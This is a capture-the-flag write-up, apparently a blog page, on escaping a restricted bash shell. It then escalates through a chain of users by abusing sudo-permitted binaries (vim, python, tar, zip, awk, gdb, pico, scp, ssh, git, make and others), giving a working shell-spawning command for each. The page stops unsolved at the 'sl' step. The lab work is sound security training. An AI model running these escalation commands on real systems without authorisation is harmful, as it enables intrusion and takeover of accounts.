---
layout: default
title: Bash-Restricted-shells
---
In this challenge we move from one user to another, using privilege escalation methods.
First, we encounter restriced `rbash` shell:

![user0](Bash-Restricted-shells.png)

### Escape using vim - user 0

Using `glob` and `echo`, I found out that the file `vim` exists on step1:
```bash
app-script-ch14@challenge02:~$ echo *
app-script-ch14-sudoers step1 step14
app-script-ch14@challenge02:~$ echo step1/*
step1/vim
```

I tried to execute `vim`:

![](Bash-Restricted-shells-1.png)

It worked. We can spawn a shell, first set the shell:
```bash
:set shell=/bin/bash
```

Then, spawn this shell:
```bash
:shell
```

![user1](Bash-Restricted-shells-2.png)

Let's add to the `PATH` variable some paths:
```bash
PATH=/bin:/usr/bin:$PATH
```

Now, we can see that we are a new user:
```bash
app-script-ch14@challenge02:~$ id
uid=1314(app-script-ch14) gid=1314(app-script-ch14) groups=1314(app-script-ch14),100(users)
```

### Escape using python - user 1

I checked for sudo permissions:
```bash
app-script-ch14@challenge02:~$ sudo -l
Matching Defaults entries for app-script-ch14 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms,
    !mail_no_user

User app-script-ch14 may run the following commands on challenge02:
    (app-script-ch14-2) NOPASSWD: /usr/bin/python
```

Okay, let's spawn a shell as user `app-script-ch14-2` using python:
```bash
sudo -u app-script-ch14-2 python -c 'import os;os.system("/bin/bash")'
```

![user2](Bash-Restricted-shells-3.png)

### Escape using tar - user 2

I checked for `sudo` permissions:
```bash
app-script-ch14-2@challenge02:~$ sudo -l
Matching Defaults entries for app-script-ch14-2 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms,
    !mail_no_user

User app-script-ch14-2 may run the following commands on challenge02:
    (app-script-ch14-3) NOPASSWD: /bin/tar
```

Using [https://gtfobins.org/gtfobins/tar/](https://gtfobins.org/gtfobins/tar/), we can get shell:
```bash
sudo -u app-script-ch14-3 tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

![user3](Bash-Restricted-shells-5.png)

### Escape using zip - user 3

I checked for `sudo` permissions:
```bash
app-script-ch14-3@challenge02:~$ sudo -l
Matching Defaults entries for app-script-ch14-3 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms,
    !mail_no_user

User app-script-ch14-3 may run the following commands on challenge02:
    (app-script-ch14-4) NOPASSWD: /usr/bin/zip
```

Using [https://gtfobins.org/gtfobins/zip/](https://gtfobins.org/gtfobins/zip/) we can get a shell:
```bash
sudo -u app-script-ch14-4 zip /tmp/bla /etc/hosts -T -TT '/bin/bash #'
```

![user4](Bash-Restricted-shells-6.png)

### Escape using awk - user 4

I checked for `sudo` permissions:
```bash
app-script-ch14-4@challenge02:~$ sudo -l
Matching Defaults entries for app-script-ch14-4 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms,
    !mail_no_user

User app-script-ch14-4 may run the following commands on challenge02:
    (app-script-ch14-5) NOPASSWD: /usr/bin/awk
```

Using [https://gtfobins.org/gtfobins/awk/](https://gtfobins.org/gtfobins/awk/) we can get shell:
```bash
sudo -u app-script-ch14-5 awk 'BEGIN {system("/bin/bash")}'
```

![user5](Bash-Restricted-shells-7.png)

### Escape using awk - user 5

I checked for `sudo` permissions:
```bash
app-script-ch14-5@challenge02:~$ sudo -l
Matching Defaults entries for app-script-ch14-5 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms,
    !mail_no_user

User app-script-ch14-5 may run the following commands on challenge02:
    (app-script-ch14-6) NOPASSWD: /usr/bin/gdb
```

Using [https://gtfobins.org/gtfobins/gdb/](https://gtfobins.org/gtfobins/gdb/) we can get shell:
```bash
sudo -u app-script-ch14-6 gdb -nx -ex '!/bin/bash' -ex quit
```

![user6](Bash-Restricted-shells-8.png)

### Escape using awk - user 6

I checked for `sudo` permissions:
```bash
app-script-ch14-6@challenge02:~$ sudo -l
Matching Defaults entries for app-script-ch14-6 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms,
    !mail_no_user

User app-script-ch14-6 may run the following commands on challenge02:
    (app-script-ch14-7) NOPASSWD: /usr/bin/pico
```

We can get privilege escalation on the next way. First, set the spell checker to be `/bin/bash`:

```bash
sudo -u app-script-ch14-7 pico -s /bin/bash
```

Now, we can write some command, for example `/bin/bash`, and trigger the spell checker by typing `ctrl+T`.

![](Bash-Restricted-shells-9.png)

![user6](Bash-Restricted-shells-10.png)

### Escape using awk - user 7

I checked for `sudo` permissions:
```bash
app-script-ch14-7@challenge02:~$ sudo -l
Matching Defaults entries for app-script-ch14-7 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms,
    !mail_no_user

User app-script-ch14-7 may run the following commands on challenge02:
    (app-script-ch14-8) NOPASSWD: /usr/bin/scp
    
```

Using [http://gtfobins.github.io/gtfobins/scp/](http://gtfobins.github.io/gtfobins/scp/) we can get shell, with this command:

```bash
sudo -u app-script-ch14-8 scp -o 'ProxyCommand=;/bin/bash 0<&2 1>&2' x x:
```

![user7](Bash-Restricted-shells-11.png)

### Escape using env - user 8

I checked for `sudo` permissions:
```bash
app-script-ch14-8@challenge02:~$ sudo -l
Matching Defaults entries for app-script-ch14-8 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms,
    !mail_no_user

User app-script-ch14-8 may run the following commands on challenge02:
    (app-script-ch14-9) NOPASSWD: /usr/bin/env
    
```

This is how we can get shell:

```bash
sudo -u app-script-ch14-9 env /bin/bash
```

![user8](Bash-Restricted-shells-12.png)

### Escape using ssh - user 9

I checked for `sudo` permissions:
```bash
Matching Defaults entries for app-script-ch14-9 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms,
    !mail_no_user

User app-script-ch14-9 may run the following commands on challenge02:
    (app-script-ch14-10) NOPASSWD: /usr/bin/ssh
    
```

This is how we can get shell, similar to `scp`:

```bash
sudo -u app-script-ch14-10 ssh -o "ProxyCommand=;/bin/bash 0<&2 1>&2" x
```


![user9](Bash-Restricted-shells-13.png)

### Escape using git - user 10

I checked for `sudo` permissions:
```bash
app-script-ch14-10@challenge02:~$ sudo -l
Matching Defaults entries for app-script-ch14-10 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms,
    !mail_no_user

User app-script-ch14-10 may run the following commands on challenge02:
    (app-script-ch14-11) NOPASSWD: /usr/bin/git
```

This is how we can get shell. First, we open help menu with `-p`, to open it in less:

```bash
sudo -u app-script-ch14-11 git -p help
```

Now, we type down the next command, and get shell:
```bash
!/bin/bash
```

![user10](Bash-Restricted-shells-14.png)



### Escape using make - user 11

I checked for `sudo` permissions:
```bash
app-script-ch14-11@challenge02:~$ sudo -l
Matching Defaults entries for app-script-ch14-11 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms,
    !mail_no_user

User app-script-ch14-11 may run the following commands on challenge02:
    (app-script-ch14-12) NOPASSWD: /usr/bin/make
```

This is how we can get shell. Notice the piping to `/dev/tty`, otherwise, it won't work:

```bash
sudo -u app-script-ch14-12 make --eval='$(shell /bin/bash > /dev/tty)'
```

![user12](Bash-Restricted-shells-15.png)

### Escape using script - user 12

I checked for `sudo` permissions:

```bash
app-script-ch14-12@challenge02:~$ sudo -l
Matching Defaults entries for app-script-ch14-12 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms,
    !mail_no_user

User app-script-ch14-12 may run the following commands on challenge02:
    (app-script-ch14-13) NOPASSWD: /usr/bin/script
```

This is how we can get shell:
```bash
sudo -u app-script-ch14-13 script /dev/null
```

![user12](Bash-Restricted-shells-16.png)

### Escape using script - user 13

I checked for `sudo` permissions:

```bash
app-script-ch14-13@challenge02:~$ sudo -l
Matching Defaults entries for app-script-ch14-13 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms,
    !mail_no_user

User app-script-ch14-13 may run the following commands on challenge02:
	    (app-script-ch14-14) NOPASSWD: /bin/rbash --
```

This is how we can get shell:

```bash
sudo -u app-script-ch14-14 /bin/rbash --
```

![user13](Bash-Restricted-shells-17.png)

### Escape using sl - user 14

Again, we are inside `rbash`. First, I checked for aviliable files in my current dir:

```bash
app-script-ch14-14@challenge02:~/step14$ echo ./*
./sl
```

We have `sl`, which is some nice train going over the terminal:

![sl](Bash-Restricted-shells-18.png)

However, I'm not sure how to get normal shell, what?